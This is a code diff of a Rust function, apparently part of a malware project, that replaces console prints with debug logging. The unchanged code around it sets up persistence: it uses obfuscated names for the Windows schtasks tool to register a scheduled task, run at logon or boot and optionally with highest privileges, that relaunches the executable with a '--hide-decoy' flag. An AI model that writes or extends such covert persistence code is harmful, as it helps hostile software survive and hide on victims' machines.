@@ -1,5 +1,6 @@
 use crate::config::Config;
 use crate::utils::obfuscate::{args, exe};
+use crate::log_debug;
 use anyhow::{Context, Result};
 use std::env;
 use tracing::{error};
@@ -10,17 +11,13 @@ pub async fn check_startup() -> Result<()> {
     let startup_config = Config::get_startup_config();
 
     if !startup_config.enabled {
-        if Config::SHOW_CONSOLE {
-            println!("Startup persistence disabled");
-        }
+        log_debug!("Startup persistence disabled");
         return Ok(());
     }
 
     let task_name = startup_config.task_name;
 
-    if Config::SHOW_CONSOLE {
-        println!("Checking for task: {}", task_name);
-    }
+    log_debug!("Checking for task: {}", task_name);
 
     let schtasks_cmd = exe::schtasks();
     let query_output = tokio::process::Command::new(&schtasks_cmd)
@@ -35,37 +32,31 @@ pub async fn check_startup() -> Result<()> {
         .context("Failed to query scheduled task")?;
 
     if query_output.status.success() {
-        if Config::SHOW_CONSOLE {
-            println!("Task '{}' already exists", task_name);
-        }
+        log_debug!("Task '{}' already exists", task_name);
         return Ok(());
     }
 
-    if Config::SHOW_CONSOLE {
-        println!("Creating task '{}'", task_name);
-        println!(
-            "Task will trigger on: {}",
-            if startup_config.on_logon {
-                "LOGON"
-            } else {
-                "BOOT"
-            }
-        );
-        println!(
-            "Privileges: {}",
-            if startup_config.highest_privileges {
-                "HIGHEST"
-            } else {
-                "NORMAL"
-            }
-        );
-    }
+    log_debug!("Creating task '{}'", task_name);
+    log_debug!(
+        "Task will trigger on: {}",
+        if startup_config.on_logon {
+            "LOGON"
+        } else {
+            "BOOT"
+        }
+    );
+    log_debug!(
+        "Privileges: {}",
+        if startup_config.highest_privileges {
+            "HIGHEST"
+        } else {
+            "NORMAL"
+        }
+    );
 
     let exe_path = env::current_exe().context("Failed to get executable path")?;
 
-    if Config::SHOW_CONSOLE {
-        println!("Executable path: {}", exe_path.display());
-    }
+    log_debug!("Executable path: {}", exe_path.display());
 
     let exe_path_quoted = format!("\"{}\" --hide-decoy", exe_path.display());
 
@@ -98,9 +89,7 @@ pub async fn check_startup() -> Result<()> {
         cmd_args.push(highest_arg);
     }
 
-    if Config::SHOW_CONSOLE {
-        println!("Running: {} {}", schtasks_cmd, cmd_args.join(" "));
-    }
+    log_debug!("Running: {} {}", schtasks_cmd, cmd_args.join(" "));
 
     // Use tokio async command to avoid blocking the runtime
     let args_refs: Vec<&str> = cmd_args.iter().map(|s| s.as_str()).collect();
@@ -120,11 +109,9 @@ pub async fn check_startup() -> Result<()> {
         anyhow::bail!("Task creation failed: {}", stderr);
     }
 
-    if Config::SHOW_CONSOLE {
-        let stdout = String::from_utf8_lossy(&create_output.stdout);
-        println!("Task created successfully");
-        println!("Output: {}", stdout);
-    }
+    let stdout = String::from_utf8_lossy(&create_output.stdout);
+    log_debug!("Task created successfully");
+    log_debug!("Output: {}", stdout);
 
     Ok(())
 }
